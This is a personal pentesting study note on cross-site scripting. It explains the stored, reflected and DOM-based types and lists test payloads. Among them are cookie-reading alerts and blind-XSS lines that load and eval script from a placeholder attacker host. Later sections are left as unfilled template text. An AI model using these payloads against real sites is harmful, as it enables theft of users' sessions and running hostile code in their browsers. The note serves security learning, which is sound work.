# Description

> [_Cross-Site Scripting_](https://owasp.org/www-community/attacks/xss/) (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

This takes advantage of improper *sanitization* (one of the most important features of a well defended web application). These are the weak points that an attacker can abuse by injecting and executing malicious code.

**Main Types**

*Stored*: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on were the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it's theoretically can't affect other users.

*Reflected*: the user input is reflected but not stored. It usually happens on search forms, login pages and pages that reflect content for one response only. When the reflected vulnerable input is in the URI (`http://www.target.com/search.php?keyword=INJECTION`) attackers can craft a malicious URI and send it to the victims hoping they will browse it. This form of XSS usually requires phishing and attackers can be limited in the length of the malicious payload (cf. [this](https://serpstat.com/blog/how-long-should-be-the-page-url-length-for-seo/)).

*DOM-based*: while stored and reflected XSS attacks exploit vulnerabilities in the server-side code, a DOM-based XSS exploits client-side ones (e.g. JavaScript used to help dynamically render a page). DOM-based XSS usually affect user inputs that are temporarily reflected, just like reflected XSS attacks.

# Command Syntax

## Stored

**Basic Payload for Testing**: if it is vulnerable once saved, when we access the website again we should see the code being executed.

```bash
# Text to save to the application.
<script>alert("XSS")</script>

<script>alert(document.cookie)</script>

<script>alert(window.origin)</script>
```

## Reflected

In this case usually we will include the payload in a URL, the most common place for this are the search pages, we can see the example below:

```bash
http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

![Reflected XSS Payload](https://www.emmanuelsolis.com/img/xss01.png)

Reflected XSS Payload

![Reflected XSS Result](https://www.emmanuelsolis.com/img/xss02.png)

Reflected XSS Result

## Blind

A good way to test this is to see if we can retrieve files externally using the JavaScript code, we can use the payloads from PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc).

```bash
<script src=http://[OUR_IP]></script>

'><script src=http://[OUR_IP]></script>

<script>$.getScript("http://[OUR_IP]")</script>

"><script src=http://[OUR_IP]></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```


# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When and why you would use this technique?

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[[Link to a related atomic note]]

[MOC - Initial Access](../../0%20-%20MOCs/MOC%20-%20Initial%20Access.md)

# References

HackTricks

PayloadsAllTheThings